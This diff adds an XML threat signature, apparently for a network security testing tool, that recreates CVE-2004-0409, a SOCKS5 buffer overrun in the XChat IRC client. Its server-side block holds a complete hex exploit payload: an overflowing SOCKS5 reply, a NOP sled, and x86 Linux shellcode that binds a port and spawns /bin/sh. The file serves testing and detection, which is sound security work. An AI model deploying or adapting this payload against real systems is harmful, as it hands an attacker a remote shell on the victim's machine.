@@ -1,0 +1,91 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="XChat SOCKS 5 Remote Buffer Overrun Vulnerability"/>
+    <EngDesc display="true" value="This server based threat responds to a SOCKS 5 request by the xchat client, over-running an internal buffer with the returned data. XChat is an IRC client which can connect through a SOCKS 5 proxy which typically listens on port 1080."/>
+    <Intent display="true">
+      <item value="Buffer_Overflow"/>
+      <item value="Crashing"/>
+      <item value="Unauthorized_Access"/>
+    </Intent>
+    <Protocol display="true" value="SOCKS5"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="XChat"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="XChat_XChat"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="XChat_XChat_1.8"/>
+      <item value="XChat_XChat_2.0"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="http://mail.nl.linux.org/xchat-announce/2004-04/msg00000.html"/>
+    <CVEID display="true" value="CVE-2004-0409"/>
+    <bugtraqID display="true" value="10168"/>
+    <OSVDB display="true" value="5490"/>
+    <Author display="true" value="Mike Davis"/>
+    <ID display="true" value="0000010966f5a92500c000a80001003c00f9cc8c"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="true"/>
+    <ServerSideAttack display="true" value="false"/>
+    <SoftwareRevision display="true" value="1.4"/>
+    <Suite display="true" value=""/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="false"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="high"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="complete"/>
+    <IntegImpact display="false" value="complete"/>
+    <AvailImpact display="false" value="partial"/>
+    <ImpactBias display="false" value="integrity"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="634413351164423099"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1305711039" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="C"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="D"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="E"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="F"/>
+    <NamedVar name="SOCKSdestPort" type="ImperfectControls.Port" value="null" index="G"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="C"/>
+      <for index="D"/>
+      <for index="E"/>
+      <for index="F"/>
+      <for index="G"/>
+    </for>
+    <for index="B"/>
+  </Loops>
+  <PostScript/>
+  <Output index="A" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="06" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="" DF="" MF="">
+        <TCP srcPort="@random(1026,65535)" destPort="$SOCKSdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="payloadbody" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="B" Count="">
+      <Ethernet srcMac="" destMac="" pktType="0800">
+        <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="06" HeaderChecksum="" srcIP="" destIP="" options="" CE="" DF="" MF="">
+          <TCP srcPort="" destPort="" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="050005000003FFF0FFFFBFF0FFFFBFF0FFFFBFF0FFFFBFF0FFFFBFF0FFFFBFF0FFFFBFF0FFFFBFF0FFFFBFF0FFFFBFF0FFFFBFF0FFFFBFF0FFFFBFF0FFFFBFF0FFFFBFF0FFFFBF00000000909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909031C0504089C350405089E1B066CD8031D2526668270F43665389E16A10515089E1B066CD8040894424044343B066CD8083C40C525243B066CD809389D1B03FCD804180F90375F652686E2F7368682F2F626989E3525389E1B00BCD80" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+        </IP>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
